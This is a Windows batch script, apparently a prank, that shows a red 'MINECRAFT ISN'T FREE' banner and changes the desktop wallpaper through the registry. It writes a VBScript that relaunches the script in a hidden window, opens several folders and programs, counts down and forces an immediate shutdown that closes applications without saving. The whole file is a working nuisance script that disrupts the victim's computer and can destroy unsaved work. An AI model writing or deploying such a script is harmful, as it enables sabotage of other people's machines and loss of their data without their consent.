@echo off
setlocal enabledelayedexpansion

:: Set the text color to red (color code 04)
color 04

:: Display the message in red
echo ====================================================
echo          M I N E C R A F T   I S N ' T   F R E E
echo ====================================================
echo.

:: Folder containing wallpapers
set "folder=%USERPROFILE%\OneDrive\Documents\Wallpapers"

:: Get the list of all images in the folder
set count=0
for %%i in ("%folder%\*.jpg") do (
    set /a count+=1
    set "wallpaper[!count!]=%%i"
)

:: Generate a random number
set /a "random=!random! %% count + 1"

:: Change the wallpaper
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "!wallpaper[%random%]!" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

:: Hide the Command Prompt window
echo Set WshShell = CreateObject("WScript.Shell") > hidecmd.vbs
echo WshShell.Run chr(34) ^& WScript.Arguments(0) ^& chr(34), 0 >> hidecmd.vbs
echo Set WshShell = Nothing >> hidecmd.vbs
wscript.exe hidecmd.vbs "%~f0"

:: Open multiple folders and default applications
start "" "%USERPROFILE%\Documents"
start "" "%USERPROFILE%\Pictures"
start "" "%USERPROFILE%\Videos"
start "" "notepad.exe"
start "" "mspaint.exe"
start "" "calc.exe"

:: Countdown timer (10 seconds)
for /l %%i in (10,-1,1) do (
    echo Shutting down in %%i seconds...
    timeout /t 1 /nobreak >nul
)

:: Shutdown command (force shutdown and close applications)
shutdown /s /f /t 0
